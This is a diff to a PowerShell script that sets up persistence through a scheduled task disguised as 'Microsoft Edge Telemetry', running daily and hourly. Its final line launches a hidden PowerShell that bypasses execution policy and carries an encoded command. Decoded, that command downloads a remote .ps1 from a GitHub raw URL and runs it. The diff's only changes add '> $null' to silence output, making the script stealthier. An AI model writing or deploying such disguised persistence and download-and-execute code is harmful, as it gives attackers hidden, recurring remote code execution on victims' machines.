@@ -4,7 +4,7 @@ Set-ItemProperty "Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\Current
 
 # Unregister previous task if present
 if(Get-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -ErrorAction SilentlyContinue) {
-    Unregister-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Confirm:$false
+    Unregister-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Confirm:$false > $null
 }
 
 # Schedule running the code
@@ -13,7 +13,7 @@ $st = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries 
 $tr = New-ScheduledTaskTrigger -Daily -At 00:00
 $tr2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 1)
 $tr.Repetition = $tr2.Repetition
-Register-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Description "This task initiates the background task for Microsoft Edge Telemetry Agent, which scans and uploads basic usage and error information for Microsoft Edge solution." -Action $ac -Settings $st -Trigger $tr
+Register-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Description "This task initiates the background task for Microsoft Edge Telemetry Agent, which scans and uploads basic usage and error information for Microsoft Edge solution." -Action $ac -Settings $st -Trigger $tr > $null
 
 # Run actual code
 powershell -w h -nol -noni -ep bypass -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA
